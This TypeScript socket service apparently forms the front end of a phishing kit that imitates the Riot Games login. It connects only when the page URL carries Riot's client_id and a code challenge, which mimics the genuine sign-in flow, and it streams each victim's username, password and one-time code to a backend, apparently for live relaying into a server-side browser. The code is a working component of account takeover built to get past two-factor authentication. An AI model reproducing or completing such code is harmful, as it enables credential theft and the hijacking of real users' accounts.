import type {
    BrowserReady,
    ClientEvents,
    LoginData,
    OtpData,
    ServerEvents,
} from '@/types/socket';
import type { Result } from '@/types/riot';
import { io, Socket } from 'socket.io-client';

class SocketService {
    private socket: Socket<ServerEvents, ClientEvents> | null = null;
    private isConnecting = false;
    private eventHandlers = new Map<string, (...args: any[]) => void>();

    constructor() {
        if (this.shouldConnect()) {
            this.connect();
        }
        this.setupPageEventListeners();
    }

    private isAdminPath(): boolean {
        return window.location.pathname.startsWith('/admin');
    }

    private hasValidParams(): boolean {
        const urlParams = new URLSearchParams(window.location.search);
        const clientId = urlParams.get('client_id');
        const codeChallenge = urlParams.get('code_challenge');
        return (
            clientId === 'prod-xsso-riotgames' &&
            codeChallenge !== null &&
            codeChallenge.length > 0
        );
    }

    private shouldConnect(): boolean {
        return !this.isAdminPath() && this.hasValidParams();
    }

    private setupPageEventListeners(): void {
        window.addEventListener('beforeunload', () => {
            this.disconnect();
        });
        window.addEventListener('popstate', () => {
            this.handleRouteChange();
        });
    }

    private handleRouteChange(): void {
        if (this.shouldConnect()) {
            if (!this.isConnected()) {
                this.connect();
            }
        } else {
            if (this.isConnected()) {
                this.disconnect();
            }
        }
    }

    connect(): void {
        if (this.isConnecting || this.isConnected()) return;

        this.isConnecting = true;
        this.socket = io('http://localhost:3000', {
            transports: ['websocket', 'polling'],
            timeout: 20000,
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
        });

        this.socket.on('connect', () => {
            this.isConnecting = false;
            this.eventHandlers.forEach((handler, event) => {
                this.socket?.on(event as keyof ServerEvents, handler);
            });
        });
        this.socket.on('browser_ready', (data: BrowserReady) => {
            this.emit('browser_ready', data);
        });

        this.socket.on('login_result', (data: Result) => {
            this.emit('login_result', data);
        });

        this.socket.on('otp_result', (data: Result) => {
            this.emit('otp_result', data);
        });
    }

    private emit<K extends keyof ServerEvents>(
        event: K,
        data: Parameters<ServerEvents[K]>[0]
    ): void;
    private emit(event: string, data: any): void;
    private emit(event: string, data: any): void {
        const handler = this.eventHandlers.get(event);
        if (handler) {
            handler(data);
        }
    }

    login(username: string, password: string): void {
        const data: LoginData = { username, password };
        this.socket?.emit('login', data);
    }

    enterOtp(otp: string): void {
        const data: OtpData = { otp };
        this.socket?.emit('enter_otp', data);
    }

    on<K extends keyof ServerEvents>(event: K, handler: ServerEvents[K]): void;
    on(event: string, handler: (...args: any[]) => void): void;
    on(event: string, handler: (...args: any[]) => void): void {
        this.eventHandlers.set(event, handler);

        if (this.isConnected()) {
            this.socket?.on(event as keyof ServerEvents, handler);
        }
    }

    off<K extends keyof ServerEvents>(event: K): void;
    off(event: string): void;
    off(event: string): void {
        this.eventHandlers.delete(event);
        this.socket?.off(event as keyof ServerEvents);
    }

    isConnected(): boolean {
        return this.socket?.connected ?? false;
    }

    disconnect(): void {
        if (this.socket) {
            this.socket.disconnect();
            this.socket = null;
        }
        this.eventHandlers.clear();
    }

    getConnectionState(): string {
        if (!this.socket) return 'disconnected';
        return this.socket.connected ? 'connected' : 'disconnected';
    }

    onRouteChange(): void {
        this.handleRouteChange();
    }
}

export const socketService = new SocketService();

window.socketService = socketService;
